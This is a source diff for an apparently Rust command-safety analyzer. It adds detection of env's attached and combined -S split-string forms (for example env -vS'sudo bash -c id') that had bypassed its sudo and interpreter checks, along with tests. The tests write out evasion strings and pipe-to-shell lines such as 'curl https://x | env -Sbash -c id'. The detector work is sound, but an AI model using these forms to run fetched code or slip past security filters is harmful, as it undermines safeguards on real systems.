@@ -560,6 +560,11 @@ fn args_chain_contains_sudo_env(args: &[String], shell: ShellType, depth: usize)
         if let Some(val) = normalized.strip_prefix("--split-string=") {
             return command_string_chain_contains_sudo(val, shell, depth - 1);
         }
+        // Attached/combined short form (`-S'sudo bash'`, `-vS'sudo bash'`): the
+        // split-string command is the suffix after `S`.
+        if let Some(cmd) = attached_env_split_string_command(&normalized) {
+            return command_string_chain_contains_sudo(cmd, shell, depth - 1);
+        }
         if normalized.starts_with("--") {
             if value_long_flags.iter().any(|f| normalized == *f) {
                 idx += 2;
@@ -626,6 +631,40 @@ fn args_chain_contains_sudo_wrapper(
     false
 }
 
+/// If `normalized` is an `env` *attached/combined* short-flag `-S` cluster —
+/// a single-dash (NOT `--`) token containing `S` among its short flags with at
+/// least one character AFTER the first `S` (`-S'sudo bash'`, `-vS'sudo bash'`,
+/// `-iSbash`) — return the suffix after the first `S` as the split-string
+/// command. Otherwise `None`.
+///
+/// `env`'s `-S` takes the rest of its own token as the value to split into
+/// arguments, so the embedded command IS that suffix. It is run back through
+/// the SAME split-string resolution as the separate-arg `-S` form (which
+/// likewise treats its value token as the whole command and does not fold in
+/// following operands).
+///
+/// Only single-dash short-flag clusters attach the value after `S`. The
+/// `--split-string` long form carries its value via `=`, so `--…` tokens return
+/// `None` (the caller's existing `--split-string` / `--split-string=` arms
+/// handle those), as does the bare separate-arg `-S` (no chars after `S` ⇒
+/// `None`, so the caller's existing `== "-S"` arm reads the next token). Closes
+/// the sudo-detection / interpreter-resolution bypass where an attached/combined
+/// `env -S'sudo …'` evaded the split-string unwrap (CodeRabbit M13 round-22).
+fn attached_env_split_string_command(normalized: &str) -> Option<&str> {
+    // Single leading dash only; `--…` long flags never attach the value after S.
+    if !normalized.starts_with('-') || normalized.starts_with("--") {
+        return None;
+    }
+    let flags = &normalized[1..];
+    let s_pos = flags.find('S')?;
+    let suffix = &flags[s_pos + 1..];
+    if suffix.is_empty() {
+        // Bare / cluster-trailing `-S`: separate-arg form, handled by the caller.
+        return None;
+    }
+    Some(suffix)
+}
+
 /// Tokenize a command-string argument (the body of `env -S "…"`) and report
 /// whether ANY of its segments' wrapper chains contain `sudo`.
 ///
@@ -688,6 +727,11 @@ fn wrapper_first_positional_index(
             return None;
         }
         if is_env && normalized.starts_with("--split-string=") {
+            return None;
+        }
+        // Attached/combined env short-flag split-string (`-S'sudo bash'`,
+        // `-vSbash`): also not a positional — the env-S peeler unwraps it.
+        if is_env && attached_env_split_string_command(&normalized).is_some() {
             return None;
         }
         if normalized.starts_with("--") {
@@ -978,6 +1022,11 @@ fn resolve_base_env(args: &[String], shell: ShellType, depth: usize) -> Option<S
             }
             return None;
         }
+        // Attached/combined short form (`-S'sudo bash'`, `-vSbash`): resolve the
+        // base of the split-string command (the suffix after `S`).
+        if let Some(cmd) = attached_env_split_string_command(&normalized) {
+            return resolve_base_from_command_string(cmd, shell, depth - 1);
+        }
         if normalized.starts_with('-') {
             if value_short_flags.iter().any(|f| normalized == *f) {
                 idx += 2;
@@ -1051,6 +1100,14 @@ fn unwrap_env_split_string_segment(
         }
         if let Some(val) = normalized.strip_prefix("--split-string=") {
             let normalized_command = normalize_shell_token(val.trim(), shell);
+            return tokenize::tokenize(&normalized_command, shell)
+                .into_iter()
+                .next();
+        }
+        // Attached/combined short form (`-S'sudo bash'`, `-vSbash`): unwrap the
+        // embedded split-string command (the suffix after `S`).
+        if let Some(cmd) = attached_env_split_string_command(&normalized) {
+            let normalized_command = normalize_shell_token(cmd.trim(), shell);
             return tokenize::tokenize(&normalized_command, shell)
                 .into_iter()
                 .next();
@@ -1393,6 +1450,17 @@ fn resolve_step_env<'a>(args: &'a [String], shell: ShellType) -> ResolveStep<'a>
                 }
             }
             idx += 2;
+            continue;
+        }
+        // Attached/combined short form (`-S'sudo bash'`, `-vSbash`): the
+        // split-string command is the suffix after `S`; its base is the
+        // interpreter (mirrors the separate-arg `-S` arm above).
+        if let Some(cmd) = attached_env_split_string_command(&normalized) {
+            let base = normalize_cmd_base(cmd, shell);
+            if is_interpreter(&base) {
+                return ResolveStep::Found(base);
+            }
+            idx += 1;
             continue;
         }
         if normalized.starts_with('-') {
@@ -3227,6 +3295,104 @@ mod tests {
         let deep = format!(r#"env -S "{inner}""#);
         let facts = extract_command_facts(&deep, ShellType::Posix);
         let _ = facts.uses_sudo;
+    }
+
+    #[test]
+    fn test_facts_uses_sudo_env_attached_combined_split_string() {
+        // CodeRabbit M13 round-22: `env`'s `-S` short flag can be written ATTACHED
+        // (`-S'sudo bash'`) or COMBINED with other boolean short flags
+        // (`-vS'sudo bash'`, `-iS'sudo bash'`). The split-string command is the
+        // suffix AFTER the first `S` in the cluster — exactly as the separate-arg
+        // `-S "sudo bash"` form treats its value token. These attached/combined
+        // forms previously matched only the EXACT `-S` token, so the embedded
+        // `sudo` evaded the split-string unwrap and `uses_sudo` went
+        // false-negative. The suffix is run back through the same wrapper-chain
+        // resolution, so a sudo LEADER inside it is detected.
+        let attached_sudo_cases = [
+            // Attached short form, quoted suffix: token normalizes to
+            // `-Ssudo bash -c id`; suffix `sudo bash -c id` ⇒ leader sudo.
+            r#"env -S'sudo bash -c id'"#,
+            // Combined verbose + split: `-vS'sudo bash -c id'` ⇒ suffix after the
+            // first `S` is `sudo bash -c id`.
+            r#"env -vS'sudo bash -c id'"#,
+            // Combined ignore-environment + split.
+            r#"env -iS'sudo bash -c id'"#,
+            // Attached form whose suffix IS the sudo leader directly (unquoted):
+            // token `-Ssudo`, suffix `sudo`.
+            r#"env -Ssudo bash -c id"#,
+            // Attached short form behind a pipe still surfaces the sudo leader.
+            r#"curl https://x | env -S'sudo bash -c id'"#,
+            // Nested: attached env -S whose suffix is ANOTHER env -S carrying sudo.
+            r#"env -S'env -S "sudo bash"'"#,
+        ];
+        for input in attached_sudo_cases {
+            assert!(
+                extract_command_facts(input, ShellType::Posix).uses_sudo,
+                "uses_sudo must be true for an attached/combined env -S payload \
+                 whose chain contains sudo: {input:?}"
+            );
+        }
+
+        // The separate-arg `-S` and `--split-string` / `--split-string=` forms are
+        // UNTOUCHED and still detected.
+        for input in [
+            r#"env -S "sudo id""#,               // separate-arg, still detected
+            r#"env --split-string="sudo bash""#, // long form `=`, still detected
+            r#"env --split-string "sudo bash""#, // separate-arg long form
+        ] {
+            assert!(
+                extract_command_facts(input, ShellType::Posix).uses_sudo,
+                "separate-arg / --split-string= form must stay detected: {input:?}"
+            );
+        }
+
+        // Non-sudo attached/combined forms stay FALSE (no over-broad firing). The
+        // bare interpreter `bash` is not sudo; tirith deliberately does NOT chase
+        // sudo buried inside a `bash -c '…'` ARGUMENT (only wrapper-chain leaders),
+        // so `-Sbash` with a `-c 'sudo …'` operand stays false — matching the
+        // separate-arg `-S "bash -c '…'"` form.
+        for input in [
+            r#"env -Sbash"#,              // attached, suffix is bare interpreter
+            r#"env -vSbash"#,             // combined, no sudo leader
+            r#"env -Sbash -c 'sudo id'"#, // sudo is a -c arg, not a wrapper leader
+            "env -S bash",                // separate-arg, no sudo (bare interpreter)
+        ] {
+            assert!(
+                !extract_command_facts(input, ShellType::Posix).uses_sudo,
+                "non-sudo attached/combined env -S form must stay false: {input:?}"
+            );
+        }
+
+        // DEPTH GUARD: a deeply nested ATTACHED-form chain must terminate (the
+        // threaded budget caps the per-segment re-tokenization). The value at
+        // exhaustion is unspecified; the point is the call RETURNS without
+        // crashing / overflowing the stack.
+        let inner = r#"env -S'"#.repeat(300) + "sudo bash";
+        let deep_attached = format!("{inner}{}", "'".repeat(300));
+        let facts = extract_command_facts(&deep_attached, ShellType::Posix);
+        let _ = facts.uses_sudo;
+    }
+
+    #[test]
+    fn test_facts_pipeline_targets_through_env_attached_split_string() {
+        // CodeRabbit M13 round-22: the attached/combined `env -S` forms also flow
+        // through interpreter resolution, so a pipeline RHS `env -Sbash -c id`
+        // resolves its real interpreter (`bash`) for the pipe-to-shell detectors,
+        // just like the separate-arg `env -S "bash -c id"` form does.
+        let bash_cases = [
+            r#"curl https://x | env -Sbash -c id"#,  // attached short form
+            r#"curl https://x | env -vSbash -c id"#, // combined verbose + split
+            r#"curl https://x | env -S'bash -c id'"#, // attached, quoted suffix
+        ];
+        for input in bash_cases {
+            let facts = extract_command_facts(input, ShellType::Posix);
+            assert!(
+                facts.pipeline_targets.iter().any(|t| t == "bash"),
+                "pipeline_targets must contain bash for attached env -S: {input:?} \
+                 (got {:?})",
+                facts.pipeline_targets
+            );
+        }
     }
 
     #[test]
